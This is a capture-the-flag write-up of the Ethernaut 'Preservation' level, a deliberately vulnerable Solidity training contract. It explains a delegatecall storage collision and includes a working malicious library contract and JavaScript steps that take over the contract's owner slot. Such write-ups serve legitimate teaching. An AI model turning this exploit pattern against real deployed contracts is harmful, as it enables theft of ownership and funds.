# Ethernaut Challenge #16: Preservation

**Objective:** Claim ownership of the Preservation contract.

**Contract Analysis:**
```solidity
contract Preservation {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

contract LibraryContract {
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

**The Vulnerability:**

`delegatecall` executes code in the CALLER's context.

**Storage Layout:**

**Preservation contract:**
```
Slot 0: timeZone1Library (address)
Slot 1: timeZone2Library (address)  
Slot 2: owner (address)
Slot 3: storedTime (uint)
```

**LibraryContract:**
```
Slot 0: storedTime (uint)
```

**The Problem:**

When `Preservation` delegatecalls `LibraryContract.setTime()`:
- Library code: `storedTime = _time` → writes to slot 0
- Preservation context: slot 0 = `timeZone1Library`!

So `setTime()` overwrites `timeZone1Library` with whatever you pass!

**The Attack:**

1. Create malicious library with compatible storage layout
2. Use `setFirstTime()` to overwrite `timeZone1Library` with malicious address
3. Call `setFirstTime()` again — now delegatecalls to YOUR contract
4. Your contract writes to slot 2 (owner) in Preservation context

**Malicious Library:**
```solidity
contract MaliciousLibrary {
  // Same slot layout as Preservation
  address public timeZone1Library;  // slot 0
  address public timeZone2Library;  // slot 1
  address public owner;             // slot 2 ← TARGET
  uint storedTime;                  // slot 3

  function setTime(uint _time) public {
    // _time is actually an address cast to uint
    owner = address(uint160(_time));
  }
}
```

**Exploit Steps:**
```javascript
// 1. Deploy MaliciousLibrary
const malicious = await deploy("MaliciousLibrary");

// 2. Overwrite timeZone1Library with malicious address
await preservation.setFirstTime(malicious.address);

// 3. Call setFirstTime again with your address as "time"
await preservation.setFirstTime(playerAddress);

// 4. Check owner — should be playerAddress!
```

**The Lesson:**

Delegatecall + library pattern is dangerous when storage layouts mismatch.

**Status:** Challenge understood. Delegatecall storage collision.
